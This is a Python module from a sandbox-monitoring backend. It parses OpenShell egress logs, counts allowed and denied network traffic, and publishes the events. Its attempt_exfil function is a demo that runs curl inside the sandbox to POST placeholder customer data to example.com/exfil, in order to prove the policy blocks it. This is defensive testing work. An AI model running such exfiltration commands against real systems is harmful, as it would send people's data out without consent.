"""OpenShell egress proof: tail the sandbox log, parse ALLOWED/DENIED lines, publish + count.

Line formats (STACK_GUIDE §12; parser adapted from Groundwork's openshell.mjs):
  L4:  [epoch] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/bin/curl(114926) -> example.com:443 [policy:- engine:opa] [reason:...]
  L7:  ... HTTP:POST [MED] DENIED POST http://api.github.com/user/repos [policy:github_api engine:opa]
"""
from __future__ import annotations

import re
import subprocess
import threading
import time
from datetime import datetime, timezone

from . import counters
from .bus import bus
from .config import settings
from .db import db

ANSI = re.compile(r"\x1b\[[0-9;]*m")
L4 = re.compile(r"^\[(?P<epoch>[\d.]+)\].*?\s(?P<activity>NET:\S+)\s+\[(?P<sev>[^\]]+)\]\s+(?P<verdict>ALLOWED|DENIED)\s+"
                r"(?P<process>\S+?)\(\d+\)\s+->\s+(?P<dest>\S+)\s+\[policy:(?P<policy>[^\s\]]*)\s+engine:[^\]]+\]"
                r"\s*(?:\[reason:(?P<reason>[^\]]*)\])?")
L7 = re.compile(r"^\[(?P<epoch>[\d.]+)\].*?\s(?P<activity>HTTP:\S+)\s+\[(?P<sev>[^\]]+)\]\s+(?P<verdict>ALLOWED|DENIED)\s+"
                r"(?P<method>[A-Z]+)\s+(?P<url>\S+)\s+\[policy:(?P<policy>[^\s\]]*)")


def parse(raw: str) -> dict | None:
    line = ANSI.sub("", raw).strip()
    if "ALLOWED" not in line and "DENIED" not in line:
        return None
    m = L4.search(line)
    if m:
        g = m.groupdict()
        return {"ts": datetime.fromtimestamp(float(g["epoch"]), timezone.utc).isoformat(), "verdict": g["verdict"],
                "process": g["process"], "dest": g["dest"], "policy": None if g["policy"] == "-" else g["policy"],
                "reason": g.get("reason"), "raw": line}
    m = L7.search(line)
    if m:
        g = m.groupdict()
        host = re.sub(r"^https?://", "", g["url"]).split("/")[0]
        return {"ts": datetime.fromtimestamp(float(g["epoch"]), timezone.utc).isoformat(), "verdict": g["verdict"],
                "process": g["method"], "dest": host, "policy": g["policy"] or None, "reason": g["url"], "raw": line}
    return {"ts": datetime.now(timezone.utc).isoformat(), "verdict": "DENIED" if "DENIED" in line else "ALLOWED",
            "process": None, "dest": None, "policy": None, "reason": None, "raw": line}


def is_customer_data_out(ev: dict) -> bool:
    """ALLOWED traffic to anything other than local inference, our host API, or the alert channels."""
    if ev["verdict"] != "ALLOWED" or not ev.get("dest"):
        return False
    host = ev["dest"].split(":")[0]
    return not any(host == d or host.endswith("." + d) for d in settings.local_dests)


def _handle(ev: dict) -> None:
    db().egress_events.insert_one(dict(ev))
    if ev["verdict"] == "DENIED":
        counters.inc("denied_total")
    elif is_customer_data_out(ev):
        counters.inc("customer_data_out")
    # Telegram's long-poll (getUpdates every ~30 s) is allowed, logged and counted, but tagged so the
    # UI can dim it; otherwise it drowns the lines that matter in a recording.
    poll = bool(ev.get("dest") and "api.telegram.org" in ev["dest"] and
                ("getUpdates" in (ev.get("reason") or "") or ev.get("process", "").endswith("node")))
    bus.publish("egress", {**{k: ev[k] for k in ("ts", "verdict", "process", "dest", "policy", "reason")},
                           "kind": "poll" if poll else "event"})


def _tail_forever() -> None:
    cmd = [settings.openshell_bin, "logs", settings.sandbox, "--source", "sandbox", "--tail"]
    while True:
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for raw in proc.stdout:  # type: ignore[union-attr]
                ev = parse(raw)
                if ev:
                    _handle(ev)
            proc.wait()
        except FileNotFoundError:
            print("[egress] openshell CLI not found; egress log disabled until it exists", flush=True)
            time.sleep(30)
        except Exception as e:  # never kill the backend
            print(f"[egress] tail error: {e}", flush=True)
        time.sleep(3)


def start() -> None:
    threading.Thread(target=_tail_forever, name="egress-tail", daemon=True).start()


def attempt_exfil() -> dict:
    """Demo: the sandboxed agent's environment tries to POST data out. OpenShell must deny it."""
    started = datetime.now(timezone.utc).isoformat()
    cmd = [settings.openshell_bin, "sandbox", "exec", "-n", settings.sandbox, "--", "/usr/bin/curl", "-sS",
           "-X", "POST", "--max-time", "5", "-d", "customer=REDACTED-DEMO", "https://example.com/exfil"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
        return {"started": started, "exit": r.returncode, "blocked": r.returncode != 0,
                "stderr": (r.stderr or r.stdout).strip().splitlines()[-1:] or [""]}
    except Exception as e:
        return {"started": started, "exit": None, "blocked": None, "error": str(e)}
